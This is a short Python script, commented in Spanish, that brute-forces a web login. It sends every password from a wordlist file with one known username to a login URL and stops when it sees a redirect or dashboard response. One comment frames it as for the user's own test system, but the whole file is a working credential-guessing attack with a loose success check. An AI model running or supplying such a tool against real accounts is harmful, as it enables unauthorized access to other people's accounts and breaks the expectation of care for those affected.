import requests

# URL del login (cambia esta URL a la de tu sistema de pruebas)
LOGIN_URL = "https://urlsitio.es/users/login"  # URL de la página de login

# Usuario conocido
USERNAME = "usuario@urlsitio.es"  # Reemplaza con el usuario a probar

# Lee las contraseñas desde un archivo
with open("passwords.txt", "r") as file:
    passwords = [line.strip() for line in file.readlines()]

# Función para intentar hacer login
def try_login(password):
    payload = {
        "username": USERNAME,  # El nombre de usuario
        "password": password,  # La contraseña actual de prueba
    }
    
    # Iniciar una sesión para manejar cookies
    session = requests.Session()
    
    # Realizar la solicitud POST al login
    response = session.post(LOGIN_URL, data=payload)
    
    # Modificamos la verificación del login exitoso
    if response.status_code == 302 or response.status_code == 200:
        # Verifica si hay redirección o si estamos en la página de inicio
        if 'location' in response.headers or 'dashboard' in response.url or len(response.history) > 0:
            print("✅ ¡Login exitoso! Contraseña: {}".format(password))
            return True
    
    print("❌ Falló con la contraseña: {}".format(password))
    return False

# Probar todas las contraseñas
for password in passwords:
    if try_login(password):
        break
